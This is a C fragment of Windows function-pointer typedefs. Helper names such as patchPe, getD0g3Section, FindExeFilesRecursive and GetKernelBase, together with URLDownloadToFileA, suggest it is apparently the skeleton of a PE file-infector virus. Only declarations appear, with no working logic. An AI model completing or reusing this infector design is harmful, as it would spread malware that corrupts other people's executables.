#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>

typedef DWORD(__stdcall* tGetProcAddress1)(
    HMODULE hModule,
    LPCSTR  lpProcName
    );
typedef HMODULE(__stdcall* tLoadLibraryA2)(
    LPCSTR lpLibFileName
    );
typedef HANDLE(__stdcall* tCreateFileA3)(
    LPCSTR                lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
    );
typedef BOOL(__stdcall* tReadFile4)(
    HANDLE       hFile,
    LPVOID       lpBuffer,
    DWORD        nNumberOfBytesToRead,
    LPDWORD      lpNumberOfBytesRead,
    LPOVERLAPPED lpOverlapped
    );
typedef BOOL(__stdcall* tWriteFile5)(
    HANDLE       hFile,
    LPCVOID      lpBuffer,
    DWORD        nNumberOfBytesToWrite,
    LPDWORD      lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped
    );
typedef DWORD(__stdcall* tSetFilePointer6)(
    HANDLE hFile,
    LONG   lDistanceToMove,
    PLONG  lpDistanceToMoveHigh,
    DWORD  dwMoveMethod
    );
typedef BOOL(__stdcall* tCloseHandle7)(
    HANDLE hObject
    );
typedef DWORD(__stdcall* tGetFileSize8)(
    HANDLE  hFile,
    LPDWORD lpFileSizeHigh
    );
typedef HGLOBAL(__stdcall* tGlobalAlloc9)(
    UINT   uFlags,
    SIZE_T dwBytes
    );
typedef HGLOBAL(__stdcall* tGlobalFree10)(
    HGLOBAL hMem
    );
//typedef int ( __stdcall* tMessageBoxA)(
//     HWND   hWnd,
//     LPCSTR lpText,
//     LPCSTR lpCaption,
//               UINT   uType
//);
typedef HANDLE(__stdcall* tFindFirstFileA11)(
    LPCSTR             lpFileName,
    LPWIN32_FIND_DATAA lpFindFileData
    );
typedef BOOL(__stdcall* tFindNextFileA12)(
    HANDLE             hFindFile,
    LPWIN32_FIND_DATAA lpFindFileData
    );
typedef BOOL(__stdcall* tFindClose13)(
    HANDLE hFindFile
    );
typedef DWORD(__stdcall* tGetModuleHandleA14)(
    LPCSTR lpModuleName
    );
typedef  BOOL(__stdcall* tDeleteFileA15)(
    LPCSTR lpFileName
    );
typedef BOOL(__stdcall* tFreeLibrary16)(
    HMODULE hModule
    );
typedef  VOID(__stdcall* tSleep17)(
    DWORD dwMilliseconds
    );
typedef  DWORD(WINAPI* tGetCurrentDirectoryA18)(
    DWORD nBufferLength,
    LPSTR lpBuffer
    );
typedef HRESULT(WINAPI* tURLDownloadToFileAFunc20)(
    LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK
    );
typedef DWORD(WINAPI* tmciSendStringAFunc22)(
    LPCSTR, LPSTR, UINT, HWND
    );
typedef DWORD(__stdcall* tf0_cmp)(char* x, char* y, int len);
typedef void(__stdcall* tf1_cpy)(char* x, char* y, int len);
typedef DWORD(__stdcall* tf2_len)(char* X);
typedef void(__stdcall* tf3_GetKernelBase)();
typedef DWORD(__stdcall* tf4_Align)(DWORD dwSize, DWORD dwAlign);
typedef DWORD(__stdcall* tf5_patchPe)(DWORD f_Name);
typedef DWORD(__stdcall* tf6_getD0g3Section)();
typedef DWORD(__stdcall* tf7_CheckFIle)(DWORD f_Name);
typedef void(__stdcall* tf8_SearchFile2)();
typedef DWORD(__stdcall* tf9_GetApi)(DWORD mImageBase, char* funcName);
typedef void(__stdcall* tf10_initApi)();
typedef void(__stdcall* tf11_freloc)(DWORD* x, int len, DWORD dif);
typedef void(__stdcall* tf12_music)();
typedef void(__stdcall* tf13_fcat)(char* x, char* y);
typedef DWORD(__stdcall* tf14_str_find)(char* x, char y);
typedef void(__stdcall* tf15_FindExeFilesRecursive)(char* directory, int* cnt);